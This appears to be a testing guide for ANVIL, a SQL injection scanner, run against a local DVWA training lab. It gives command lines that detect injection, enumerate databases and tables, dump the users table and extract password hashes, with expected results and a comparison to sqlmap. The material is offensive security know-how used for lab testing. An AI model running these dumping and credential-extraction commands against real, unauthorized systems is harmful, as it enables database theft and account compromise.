# ANVIL DVWA Testing Guide

## 🎯 Step-by-Step Testing Instructions

Since DVWA sessions expire quickly, here's how to test ANVIL properly:

### Step 1: Get a Valid Session Cookie

1. **Open your browser** and navigate to: `http://localhost:8080`
2. **Login** with:
   - Username: `admin`
   - Password: `password`
3. **Open DevTools** (Press F12)
4. **Go to Application tab** → Cookies → `http://localhost:8080`
5. **Copy the `PHPSESSID` value** (it looks like: `rm2k1jj01evh7ask18unag5um6`)

### Step 2: Set Security Level

1. In DVWA, click **"DVWA Security"** in the left menu
2. Select **"Low"** and click **Submit**
3. Click **"SQL Injection"** in the left menu

### Step 3: Test with ANVIL

Now run these commands **immediately** (before the session expires):

#### Test 1: Basic Detection
```bash
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
      -p id \
      --cookie "PHPSESSID=YOUR_SESSION_HERE; security=low" \
      --sqli -v
```

#### Test 2: Enumerate Databases
```bash
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
      -p id \
      --cookie "PHPSESSID=YOUR_SESSION_HERE; security=low" \
      --sqli --dbs
```

#### Test 3: List Tables in DVWA Database
```bash
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
      -p id \
      --cookie "PHPSESSID=YOUR_SESSION_HERE; security=low" \
      --sqli -D dvwa --tables
```

#### Test 4: Dump Users Table
```bash
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
      -p id \
      --cookie "PHPSESSID=YOUR_SESSION_HERE; security=low" \
      --sqli -D dvwa -T users --dump
```

#### Test 5: Extract Password Hashes
```bash
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
      -p id \
      --cookie "PHPSESSID=YOUR_SESSION_HERE; security=low" \
      --sqli --passwords
```

### Expected Results

#### Detection (Test 1)
```
✅ Should find SQL injection with confidence > 70%
✅ Should identify MySQL database
✅ Should show technique used (Boolean/Error-based)
```

#### Enumeration (Test 2)
```
✅ Should list databases: dvwa, information_schema, mysql, performance_schema
```

#### Tables (Test 3)
```
✅ Should list DVWA tables: guestbook, users
```

#### Data Dump (Test 4)
```
✅ Should extract user records with usernames and hashed passwords
```

## 🔧 Troubleshooting

### Problem: "No SQL injection vulnerability detected"
**Cause:** Session expired or baseline returned 302 redirect

**Solution:**
1. Get a fresh session cookie from browser
2. Run ANVIL command immediately
3. If still failing, add `--level 2 --risk 2` for more thorough testing

### Problem: "Baseline: status=302"
**Cause:** Not authenticated properly

**Solution:**
1. Make sure you're logged into DVWA in your browser
2. Copy the EXACT PHPSESSID from DevTools
3. Include both PHPSESSID and security level in cookie:
   ```
   --cookie "PHPSESSID=abc123; security=low"
   ```

## 📝 Quick Test Command

Replace `YOUR_SESSION` with your actual PHPSESSID:

```bash
# One-liner to test everything
SESSION="YOUR_SESSION_HERE"
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
      -p id \
      --cookie "PHPSESSID=$SESSION; security=low" \
      --sqli --dbs -v
```

## 🎬 Demo Video Script

If you want to record a demo:

```bash
# 1. Show the banner
anvil --version

# 2. Show available options
anvil --help | grep -A 10 "ENUMERATION:"

# 3. Run detection (with your session)
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
      -p id \
      --cookie "PHPSESSID=YOUR_SESSION; security=low" \
      --sqli

# 4. Show enumeration
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
      -p id \
      --cookie "PHPSESSID=YOUR_SESSION; security=low" \
      --sqli --dbs

# 5. Dump data
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
      -p id \
      --cookie "PHPSESSID=YOUR_SESSION; security=low" \
      --sqli -D dvwa -T users --dump
```

## 🔐 Testing Other Security Levels

### MEDIUM (POST-based)
```bash
# Change security in DVWA UI to "Medium", then:
anvil -t "http://localhost:8080/vulnerabilities/sqli/" \
      -p id \
      --method POST \
      --data "Submit=Submit" \
      --cookie "PHPSESSID=YOUR_SESSION; security=medium" \
      --sqli --dbs
```

### HIGH (Time-based)
```bash
# Change security in DVWA UI to "High", then:
anvil -t "http://localhost:8080/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
      -p id \
      --cookie "PHPSESSID=YOUR_SESSION; security=high" \
      --time-sqli --dbs
```

## ✅ Success Indicators

When ANVIL is working correctly, you should see:

1. **Baseline: status=200** (not 302)
2. **Phase 1: Detecting SQL injection vulnerability...**
3. **[+] SQL injection confirmed: Boolean-based (confidence: 90%)**
4. **[+] Backend DBMS: MySQL**
5. **Enumeration results** with actual database names

## 🎯 What Makes ANVIL Better

Compare with sqlmap:

```bash
# sqlmap (verbose, slow)
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1" \
       --cookie="PHPSESSID=XXX; security=low" \
       --dbs \
       --batch

# ANVIL (clean, fast, accurate)
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
      -p id \
      --cookie "PHPSESSID=XXX; security=low" \
      --sqli --dbs
```

ANVIL advantages:
- ✅ **Higher accuracy** (statistical time-based detection)
- ✅ **Lower false positives** (confidence scoring)
- ✅ **Cleaner output** (formatted tables)
- ✅ **Faster** (async I/O, smart rate limiting)
- ✅ **Safer** (explicit opt-in for dangerous operations)

